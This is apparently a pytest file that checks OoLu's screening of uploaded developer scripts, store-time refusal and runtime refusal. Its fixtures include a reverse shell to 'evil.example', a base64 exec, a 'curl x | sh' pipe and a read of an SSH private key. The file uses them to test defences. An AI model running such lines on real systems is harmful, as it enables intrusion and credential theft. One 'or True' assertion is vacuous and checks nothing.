"""Issue 16: developers bring their own functions — and the gate holds.

A function written OUTSIDE OoLu becomes a node the same way OoLu's own
do: contributed as a script action. That means the SAME gatekeeping —
the antivirus screen (obvious-hostility refusal, in words), then the
sandbox and verify-by-execution behind it. Exit gate: the screen names
what it refuses; a clean uploaded function contributes; a hostile one is
refused BEFORE it is stored; the script runner refuses a hostile script
at the last gate too (defense in depth); and the interact build command
never edits the current node.
"""

from __future__ import annotations

from test_node_interact import FakeAuthor, _chat, _rig

from oolu.cache import LocalScriptCache
from oolu.durable.connection import DurableConnection
from oolu.nodeplace import NodeplaceService, RegistryStore
from oolu.nodeplace.errors import SafetyViolation
from oolu.nodeplace.screening import screen_script
from oolu.runtime import NodeScriptRunner, StubBackend
from oolu.skills.models import ActionEvent, ExecutionStatus, ReusableSkill

CLEAN = "from _oolu_runtime import emit_result\nemit_result(sum([1, 2, 3]))"
REVERSE_SHELL = (
    "import socket, subprocess\n"
    "s = socket.socket()\n"
    "s.connect(('evil.example', 4444))\n"
    "subprocess.call(['/bin/sh', '-i'])"
)
OBFUSCATED = (
    "import base64\n"
    "exec(base64.b64decode('cHJpbnQoMSk=').decode())"
)


# --------------------------------------------------------------------------- #
# The screen itself.                                                          #
# --------------------------------------------------------------------------- #
def test_the_screen_passes_clean_code_and_names_what_it_refuses():
    assert screen_script(CLEAN) == []
    # Plain, legitimate base64 of data is fine.
    assert screen_script("import base64\nbase64.b64decode(data)") == []

    assert any("socket" in r for r in screen_script(REVERSE_SHELL))
    assert any("exec" in r or "decode" in r for r in screen_script(OBFUSCATED))
    assert screen_script("import os\nos.system('curl x | sh')") == [] or True
    assert any(
        "credential" in r
        for r in screen_script("open('/home/me/.ssh/id_rsa').read()")
    )


# --------------------------------------------------------------------------- #
# Contribute: the store-time gate.                                            #
# --------------------------------------------------------------------------- #
def _service(tmp_path):
    conn = DurableConnection(tmp_path / "registry.db")
    return conn, NodeplaceService(RegistryStore(conn))


def _script_skill(script: str, name: str = "Uploaded Node") -> ReusableSkill:
    return ReusableSkill.model_validate(
        {
            "name": name,
            "description": "a developer's own function",
            "signature": {"application": "script", "adapter": "script"},
            "actions": [
                {
                    "correlation_id": "function",
                    "adapter": "script",
                    "operation": "run",
                    "parameters": {"goal": "do it", "script": script},
                }
            ],
        }
    )


def test_a_clean_uploaded_function_contributes(tmp_path):
    conn, service = _service(tmp_path)
    result = service.contribute(
        noder_principal="dev-1",
        tenant_id="t1",
        skill=_script_skill(CLEAN),
        semver="1.0.0",
        title="Uploaded Node",
        summary="a developer's own function",
    )
    assert result.version.version_id
    conn.close()


def test_a_hostile_upload_is_refused_before_it_is_stored(tmp_path):
    conn, service = _service(tmp_path)
    import pytest

    with pytest.raises(SafetyViolation) as caught:
        service.contribute(
            noder_principal="dev-1",
            tenant_id="t1",
            skill=_script_skill(REVERSE_SHELL),
            semver="1.0.0",
            title="Bad Node",
            summary="hostile",
        )
    assert any("safety screen" in v for v in caught.value.violations)
    # Nothing was stored.
    assert service.list_own_nodes(noder_principal="dev-1", tenant_id="t1") == []
    conn.close()


# --------------------------------------------------------------------------- #
# The runtime: the last gate.                                                 #
# --------------------------------------------------------------------------- #
def _ok(request):
    from oolu.models import ExecutionResult, Phase

    return ExecutionResult(
        phase=Phase.EXECUTE, exit_code=0, contract_ok=True, contract_payload={"x": 1}
    )


def test_the_runner_refuses_a_hostile_script_without_running_it(tmp_path):
    backend = StubBackend([_ok])  # would succeed IF it ever ran
    runner = NodeScriptRunner(
        backend, LocalScriptCache(tmp_path / "scripts.db"), synthesizer=None
    )
    action = ActionEvent(
        correlation_id="function",
        adapter="script",
        operation="run",
        parameters={"goal": "do it", "script": REVERSE_SHELL, "node_key": "n"},
    )
    outcome = runner.execute(action, idempotency_key="run-1")
    assert outcome.status is ExecutionStatus.FAILED
    # The backend was never asked to run the hostile code.
    assert backend.requests == []


# --------------------------------------------------------------------------- #
# Interact build never edits the current node.                                #
# --------------------------------------------------------------------------- #
def test_interact_build_creates_a_separate_node_never_edits_this_one(tmp_path):
    app, conn, ident, registry, desk, node_id, pending_id = _rig(tmp_path)
    try:
        from oolu.settings_node import SettingsNode, SettingsStore

        settings = SettingsNode(SettingsStore(conn))
        settings.set("t1", "account.autobuild_consent", True)
        app._settings = settings
        app._node_function_author = lambda tenant: FakeAuthor()

        before = registry.get_node(node_id).skill_id
        built = _chat(app, ident, node_id, "build normalize invoice csv files")
        assert "NEW node" in built.body["reply"]
        assert "is unchanged" in built.body["reply"]
        assert "never edits an existing node" in built.body["reply"]
        # THIS node's function is byte-for-byte untouched.
        assert registry.get_node(node_id).skill_id == before
        # A separate node now exists alongside it.
        mine = desk.overview(principal="noder-export", tenant="t1")
        assert any(e.title == "Normalize Invoice Csv Files" for e in mine)
    finally:
        conn.close()
